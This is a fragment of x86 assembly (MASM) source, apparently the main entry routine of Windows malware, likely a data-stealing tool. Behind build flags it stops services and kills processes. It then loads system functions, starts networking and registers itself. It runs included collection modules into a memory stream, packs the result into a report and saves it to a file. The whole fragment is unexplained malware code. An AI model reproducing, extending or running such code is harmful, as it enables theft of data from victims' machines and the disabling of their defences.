.data?
        lpBuf   db      1024 dup(?)
.code

start:
IFDEF MOD_SVCSTOP
invoke StopServices
ENDIF

IFDEF MOD_ACTAFTER
invoke cmptime
ENDIF

IFDEF MOD_KILLPROC
invoke CreateThread, NULL, 0, addr KillProcsThread, NULL, 0, addr lpBuf1
invoke KillProcs
ENDIF
	include Plus2.asm
	invoke	DoLoadLib, offset szSHFolder, offset dwSHGetFolderPath
	invoke	DoLoadLib, offset szKernel, offset dwExpandEnvironmentStrings
	invoke	DoLoadLib, offset szPsApi, offset dwGetModuleFileNameEx
	invoke  WSAStartup, @MAKEWORD(1,1), offset lpWSAData
	invoke	RegistMe
	invoke  CreateStreamOnHGlobal, NULL, TRUE, offset lpOutStream 
	include Modules.asm
	invoke	ExportModule, 0ffffffffh
	include PckRep.asm
	invoke  StreamSaveToFile, lpOutStream
	coinvoke lpOutStream, IStream, Release